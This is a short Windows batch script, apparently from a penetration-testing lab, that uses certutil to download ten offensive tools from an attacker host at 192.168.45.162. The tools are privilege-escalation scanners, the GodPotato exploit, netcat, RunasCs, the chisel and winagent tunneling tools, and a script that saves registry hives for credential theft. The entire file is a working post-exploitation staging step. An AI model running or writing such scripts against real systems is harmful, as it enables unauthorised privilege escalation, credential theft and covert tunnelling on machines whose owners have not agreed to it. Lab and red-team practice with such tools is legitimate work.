@echo off
echo Starting downloads...
echo.

echo [1/10] Downloading PrivescCheck.ps1...
certutil -urlcache -f -split http://192.168.45.162:8000/windows/PrivescCheck.ps1 || goto :error
echo Completed PrivescCheck.ps1
echo.

echo [2/10] Downloading PowerUp.ps1...
certutil -urlcache -f -split http://192.168.45.162:8000/windows/PowerUp.ps1 || goto :error
echo Completed PowerUp.ps1
echo.

echo [3/10] Downloading winPEASx64.exe...
certutil -urlcache -f -split http://192.168.45.162:8000/windows/winPEASx64.exe || goto :error
echo Completed winPEASx64.exe
echo.

echo [4/10] Downloading GodPotato-NET4.exe...
certutil -urlcache -f -split http://192.168.45.162:8000/windows/GodPotato-NET4.exe || goto :error
echo Completed GodPotato-NET4.exe
echo.

echo [5/10] Downloading nc.exe...
certutil -urlcache -f -split http://192.168.45.162:8000/windows/nc.exe || goto :error
echo Completed nc.exe
echo.

echo [6/10] Downloading RunasCs.exe...
certutil -urlcache -f -split http://192.168.45.162:8000/windows/RunasCs.exe || goto :error
echo Completed RunasCs.exe
echo.

echo [7/10] Downloading win_rdp_setup.bat...
certutil -urlcache -f -split http://192.168.45.162:8000/windows/win_rdp_setup.bat || goto :error
echo Completed win_rdp_setup.bat
echo.

echo [8/10] Downloading chisel.exe...
certutil -urlcache -f -split http://192.168.45.162:8000/tunneling/chisel.exe || goto :error
echo Completed chisel.exe
echo.

echo [9/10] Downloading winagent.exe...
certutil -urlcache -f -split http://192.168.45.162:8000/tunneling/winagent.exe || goto :error
echo Completed winagent.exe
echo.

echo [10/10] Downloading save_registry_hives.bat...
certutil -urlcache -f -split http://192.168.45.162:8000/windows/save_registry_hives.bat || goto :error
echo Completed save_registry_hives.bat
echo.

echo All downloads completed successfully.
goto :eof

:error
echo.
echo ERROR: A download failed. Stopping script.
exit /b 1